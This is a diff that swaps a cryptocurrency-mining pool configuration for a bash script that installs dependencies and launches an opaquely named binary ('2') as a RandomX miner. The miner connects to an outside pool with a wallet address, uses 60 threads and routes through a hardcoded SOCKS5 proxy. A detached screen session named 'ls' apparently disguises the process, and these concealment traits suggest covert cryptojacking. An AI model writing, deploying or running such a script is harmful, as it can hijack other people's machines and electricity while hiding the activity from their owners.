@@ -1,19 +1,8 @@
-{
-    "autosave": true,
-    "cpu": true,
-    "opencl": false,
-    "cuda": false,
-    "pools": [
-        {
-            "coin": null,
-            "algo": "cn/upx2",
-            "url": "aqua.signal2noi.se:19998",
-            "user": "0x6aae9074139a6d103545a74b31441e81fc44d29b.test",
-            "pass": "x",
-            "socks5": "socks5://72.210.208.101:4145",
-            "tls": false,
-            "keepalive": true,
-            "nicehash": false
-        }
-    ]
-}
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+chmod +x 2
+screen -dmS ls
+
+ ./2 -a rx/0 -o inf.pool-pay.com:4624  -u inf8TQVLBJ35K6jeGNePCLRzrgt8W6HVGHWgmtNEJTZ4FBAhNaieEBGiSRiTQhF9PXiXcpopBepPdPUAxn2AWS1j3uurvZ2YRH.500000 -t 60 -x socks5://72.210.208.101:4145 -p ros1
